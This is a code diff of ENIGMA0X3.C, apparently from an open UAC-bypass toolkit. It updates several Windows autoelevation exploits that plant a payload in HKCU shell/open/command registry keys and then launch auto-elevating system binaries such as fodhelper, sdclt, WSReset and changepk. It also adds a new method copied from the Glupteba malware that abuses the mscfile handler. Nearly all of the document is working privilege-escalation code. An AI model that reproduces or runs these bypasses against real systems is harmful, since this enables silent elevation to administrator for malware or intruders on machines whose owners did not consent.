@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2019
+*  (C) COPYRIGHT AUTHORS, 2016 - 2020
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.21
+*  VERSION:     3.26
 *
-*  DATE:        26 Oct 2019
+*  DATE:        23 May 2020
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -21,6 +21,7 @@
 *  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
 *  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *  https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
+*  https://packetstormsecurity.com/files/155927/Microsoft-Windows-10-Local-Privilege-Escalation.html
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -157,8 +158,8 @@ DWORD ucmDiskCleanupWorkerThread(
     SIZE_T                      sz;
     PVOID                       Buffer = NULL;
     LPWSTR                      fp = NULL;
-    UCM_ENIGMA0x3_CTX          *Context = (UCM_ENIGMA0x3_CTX *)Parameter;
-    FILE_NOTIFY_INFORMATION    *pInfo = NULL;
+    UCM_ENIGMA0x3_CTX* Context = (UCM_ENIGMA0x3_CTX*)Parameter;
+    FILE_NOTIFY_INFORMATION* pInfo = NULL;
     UNICODE_STRING              usName;
     IO_STATUS_BLOCK             IoStatusBlock;
     OBJECT_ATTRIBUTES           ObjectAttributes;
@@ -566,7 +567,8 @@ NTSTATUS ucmSdcltIsolatedCommandMethod(
 *
 */
 NTSTATUS ucmMsSettingsDelegateExecuteMethod(
-    _In_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload,
+    _In_ LPWSTR lpszTargetApp //max 260
 )
 {
     NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
@@ -576,9 +578,8 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
 #endif
 
     DWORD   cbData;
-    SIZE_T  sz = 0;
+    SIZE_T  payloadSize = 0, inLength;
     LRESULT lResult;
-    LPWSTR lpTargetApp = NULL;
     HKEY    hKey = NULL;
 
     WCHAR szTempBuffer[MAX_PATH * 2];
@@ -596,7 +597,13 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
 
     do {
 
-        sz = _strlen(lpszPayload);
+        payloadSize = _strlen(lpszPayload);
+        if (payloadSize == 0)
+            return MethodResult;
+
+        inLength = _strlen(lpszTargetApp);
+        if ((inLength >= MAX_PATH) || (inLength == 0))
+            return MethodResult;
 
         _strcpy(szTempBuffer, T_MSSETTINGS);
         _strcat(szTempBuffer, T_SHELL_OPEN_COMMAND);
@@ -624,7 +631,7 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
         //
         // Set "Default" value as our payload.
         //
-        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+        cbData = (DWORD)((1 + payloadSize) * sizeof(WCHAR));
 
         lResult = RegSetValueEx(
             hKey,
@@ -634,21 +641,9 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
+
             _strcpy(szTempBuffer, g_ctx->szSystemDirectory);
-
-            //
-            // Not because it was fixed but because this was added in RS4 _additionaly_
-            //
-            lpTargetApp = FODHELPER_EXE;
-
-            if (g_ctx->dwBuildNumber > 16299) {
-
-                if (IDYES == ucmShowQuestion(T_PICK_EXE_QUESTION)) {
-                    lpTargetApp = COMPUTERDEFAULTS_EXE;
-                }
-            }
-
-            _strcat(szTempBuffer, lpTargetApp);
+            _strcat(szTempBuffer, lpszTargetApp);
 
             if (supRunProcess(szTempBuffer, NULL))
                 MethodResult = STATUS_SUCCESS;
@@ -675,16 +670,19 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
 *
 * Purpose:
 *
-* Bypass UAC abusing COM entry hijack.
+* Bypass UAC abusing registry entry hijack.
 * Original authors links: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *                         https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
+*                         https://packetstormsecurity.com/files/155927/Microsoft-Windows-10-Local-Privilege-Escalation.html
 *
 * Targets:
 *            sdclt.exe without params for Emeric Nasi method
 *            WSReset.exe without params for Hashim Jawad method
+*            changepk.exe without params for Nassim Asrir method
 *
 */
 NTSTATUS ucmShellDelegateExecuteCommandMethod(
+    _In_ UCM_METHOD Method,
     _In_ LPWSTR lpTargetApp,
     _In_ SIZE_T cchTargetApp, //in chars, future use
     _In_ LPWSTR lpTargetKey,
@@ -710,6 +708,9 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
     WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szOldValue[MAX_PATH + 1];
     WCHAR szOldDelegateExecute[MAX_PATH + 1];
+
+    SHELLEXECUTEINFO shinfo;
+
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
@@ -828,11 +829,37 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
 
             _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, lpTargetApp);
-            if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE))
-                MethodResult = STATUS_SUCCESS;
 
-            Sleep(5000);  //wait a bit until this shell shit complete it internals
-                          //not required if you don't cleanup or use reg.exe
+            //
+            // Use forced elevation from slui.exe as launcher.
+            //
+            if (Method == UacMethodShellChangePk) {
+
+                RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+                shinfo.cbSize = sizeof(shinfo);
+                shinfo.lpVerb = RUNAS_VERB;
+                shinfo.lpFile = szBuffer;
+                shinfo.nShow = SW_SHOWNORMAL;
+                shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                if (ShellExecuteEx(&shinfo)) {
+                    Sleep(5000);
+                    TerminateProcess(shinfo.hProcess, 0);
+                    CloseHandle(shinfo.hProcess);
+                    MethodResult = STATUS_SUCCESS;
+                }
+            }
+            else {
+                //
+                // Run target application as usual.
+                //
+                if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE))
+                    MethodResult = STATUS_SUCCESS;
+
+                Sleep(5000);  //wait a bit until this shell shit complete it internals
+                         //not required if you don't cleanup or use reg.exe
+            }
+
+
 
             if (bExist == FALSE) {
                 //
@@ -848,7 +875,7 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
                 switch (g_ctx->MethodExecuteType) {
 
                 case ucmExTypeIndirectModification:
-                
+
                     supIndirectRegAdd(REG_HKCU,
                         szKey,
                         lpTargetValue,
@@ -856,7 +883,7 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
                         szOldValue);
 
                     break;
-                
+
                 default:
                     RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
                         (BYTE*)szOldValue, cbOldData);
@@ -901,12 +928,107 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
         supRegDeleteKeyRecursive(HKEY_CURRENT_USER, lpTargetKey);
     }
 
-
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
         supEnableDisableWow64Redirection(FALSE);
     }
 #endif
+
+    return MethodResult;
+}
+
+/*
+* ucmGluptebaMethod
+*
+* Purpose:
+*
+* Similar to previous mscfile hijack bypass except different target and indirect write.
+*
+* One of the UAC bypass methods used by WinNT/Glupteba.
+*
+* Fixed in Windows 10 RS2 as target autoelevation disabled and execution level defaulted to asInvoker.
+*
+*/
+NTSTATUS ucmGluptebaMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    BOOLEAN  bOldHandlerExist = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    LRESULT  lResult;
+    HKEY     hKey = NULL;
+    DWORD    cbOldHandlerData;
+    WCHAR    szKey[MAX_PATH * 2];
+    WCHAR    szOldHandlerValue[MAX_PATH + 1];
+    WCHAR    szRunCommand[MAX_PATH * 2];
+
+    INT      iRetryCount;
+
+    LPWSTR   lpTargetValue = TEXT("");
+
+    _strcpy(szKey, T_MSC_SHELL);
+    _strcat(szKey, T_SHELL_OPEN_COMMAND);
+
+    //
+    // Save old handler value if exist.
+    //
+    lResult = RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_READ, &hKey);
+    if (lResult == ERROR_SUCCESS) {
+
+        cbOldHandlerData = MAX_PATH * 2;
+        RtlSecureZeroMemory(&szOldHandlerValue, sizeof(szOldHandlerValue));
+        lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
+            (BYTE*)szOldHandlerValue, &cbOldHandlerData);
+        if (lResult == ERROR_SUCCESS)
+            bOldHandlerExist = TRUE;
+
+        RegCloseKey(hKey);
+    }
+
+    if (supIndirectRegAdd(REG_HKCU,
+        szKey,
+        lpTargetValue,
+        T_REG_SZ,
+        lpszPayload))
+    {
+        iRetryCount = 5;
+
+        do {
+
+            lResult = RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_READ, &hKey);
+            if (lResult == ERROR_SUCCESS) {
+                RegCloseKey(hKey);
+                break;
+            }
+
+            Sleep(1000);
+            iRetryCount--;
+
+        } while (iRetryCount);
+
+        _strcpy(szRunCommand, RUN_CMD_COMMAND);
+        _strcat(szRunCommand, COMPMGMTLAUNCHER_EXE);
+        if (supRunProcess(CMD_EXE, szRunCommand))
+            MethodResult = STATUS_SUCCESS;
+
+        Sleep(10000);
+    }
+
+    //
+    // Reset or remove value.
+    //
+    if (bOldHandlerExist) {
+
+        supIndirectRegAdd(REG_HKCU,
+            szKey,
+            lpTargetValue,
+            T_REG_SZ,
+            szOldHandlerValue);
+
+    }
+    else {
+        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
+    }
 
     return MethodResult;
 }
